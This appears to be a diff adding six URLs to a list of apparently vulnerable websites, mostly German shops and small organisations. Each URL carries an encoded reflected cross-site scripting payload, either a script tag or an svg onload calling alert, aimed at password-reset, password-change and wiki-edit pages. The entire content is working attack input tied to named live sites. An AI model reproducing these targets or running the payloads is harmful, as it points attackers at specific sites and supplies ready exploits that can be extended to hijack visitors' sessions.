@@ -1,0 +1,6 @@
+http://fashion-lounge24.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+http://faunistik-landschaftsoekologie.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://fb-rm.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://feldhofensche-apotheke.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+http://feltloom.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://fenster-dimov.de/tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E
